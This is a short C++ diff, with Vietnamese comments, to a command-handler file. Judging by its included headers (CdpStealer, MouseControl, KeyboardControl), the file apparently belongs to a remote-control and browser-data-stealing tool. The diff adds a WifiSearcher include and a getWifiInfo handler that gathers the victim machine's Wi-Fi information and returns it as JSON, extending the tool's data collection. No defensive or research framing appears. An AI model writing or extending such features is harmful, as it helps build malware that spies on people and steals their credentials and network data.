@@ -9,6 +9,7 @@
 #include "MouseControl.h"
 #include "CdpStealer.h"
 #include "KeyboardControl.h"
+#include "WifiSearcher.h"
 
 // Helper: Trả về JSON status chuẩn
 json ProcessHandlers::makeStatus(bool success, const std::string &msg, json extra)
@@ -281,4 +282,13 @@ json ProcessHandlers::handleKeyboardInput(const json &req)
     }
 
     return {};
+}
+
+json ProcessHandlers::getWifiInfo(const json &) {
+    json wifiData = WifiSearcher::getWifiInfo(); 
+    
+    wifiData["type"] = "wifi_info";
+    wifiData["success"] = true;
+
+    return wifiData;
 }
